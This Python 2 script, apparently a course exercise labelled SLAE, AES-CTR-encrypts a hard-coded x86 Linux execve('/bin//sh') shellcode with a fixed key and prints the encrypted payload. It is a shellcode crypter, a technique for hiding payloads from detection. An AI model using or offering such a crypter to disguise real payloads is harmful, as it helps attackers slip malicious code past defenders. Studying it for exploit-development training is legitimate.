#!/usr/bin/python


######################
# Author: Anubis     #
# SLAE               #
######################




import pyaes

key = '0123456789abcdef0123456789abcdef' # "Random" key

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

counter = pyaes.Counter(initial_value = 100)
aes = pyaes.AESModeOfOperationCTR(key, counter = counter)


crypted_code = aes.encrypt(shellcode)
final_shellcode = ""
for x in bytearray(crypted_code) :
     	final_shellcode += '\\x'
        final_shellcode += '%02x' % x

print "[+] Encrypted shellcode: %s"%(final_shellcode)
print "[+] Use this for the shellcode %s" % (final_shellcode.replace('\\x', ''))
